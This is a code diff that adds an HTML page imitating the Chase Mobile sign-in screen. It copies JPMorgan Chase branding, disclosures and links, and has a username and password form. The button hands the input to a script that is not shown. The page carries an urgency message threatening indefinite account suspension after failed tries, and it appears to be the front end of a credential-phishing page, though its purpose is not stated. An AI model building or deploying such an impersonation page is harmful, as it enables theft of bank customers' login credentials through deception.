@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to Chase Mobile</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="/icons/60394399d4d69e00040ae03d.png" type="image/x-icon">
+</head>
+<body>
+    <section class="login-page">
+         <nav>
+            <img src="/icons/WhatsApp_Image_2024-04-01_at_2.22.42_PM-removebg-preview.png" alt="">
+         </nav>
+         <form action="">
+            <div class="username userpass">
+                <h6>Enter your username</h6>
+                <input type="text" name="username" id="username">
+            </div>
+            <div class="password userpass">
+                <h6>Enter your password</h6>
+                <input type="password" name="password" id="password">
+            </div>
+            <div class="check-boxes">
+                <div class="remember-token">
+                    <input type="checkbox" name="remember-me" id="check-box">
+                    <p>Remember me</p>
+                </div>
+                <div class="remember-token">
+                    <input type="checkbox" name="token" id="check-box">
+                    <p>Use token</p>
+                </div>
+            </div>
+            <input type="button" value="Sign in" id="sign-in-button" onclick="login()">
+            <div id="incorrect">
+                <p>Incorrect Username or Password <br>You have 2 more try before your account is suspended indefinitely</p>
+            </div>
+
+            <a href="http://" class="forgotten"><h5>Forgot username or password?</h5></a>
+            
+         </form>
+         <div class="bottom-wrapper">
+            <div class="bottom-wrapper-header">
+                <a href="https://secure.chase.com/web/auth/enrollment#/enroll/onlineEnrollment/gettingStarted/index?LOB=COLLogon">Sign up</a>
+                <a href="https://secure.chase.com/web/auth/enrollment#/enroll/onlineEnrollment/gettingStarted/index?LOB=COLLogon">Open an account</a>
+                <a href="https://www.chase.com/digital/resources/privacy-security">Privacy</a>
+            </div>
+            <div class="copyrights">
+                <p>Equal Housing Opportunity</p>
+                <p>Deposit products provided by JPMorgan Chase Bank, N.A. Member FDIC</p>
+                <p>Credit cards are issued by JPMorgan Chase Bank, N.A. Member FDIC</p>
+                <p>© 2024 JPMorgan Chase & Co.</p>
+            </div>
+            <div class="disclosures">
+                <h6>DISCLOSURES</h6>
+                <p>Investment products and services are offered through J.P. Morgan Securities LLC (JPMS), a Member of <a href="https://www.finra.org/">FINRA</a> and <a href="https://www.sipc.org/">SIPC</a>.</p>
+                <h5>INVESTMENT AND INSURANCE PRODUCTS ARE: NOT A DEPOSIT NOT FDIC INSURED NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY NO BANK GUARANTEE MAY LOSE VALUE</h5>
+            </div>
+         </div>
+    </section>
+</body>
+<script src="/login.js"></script>
+</html>
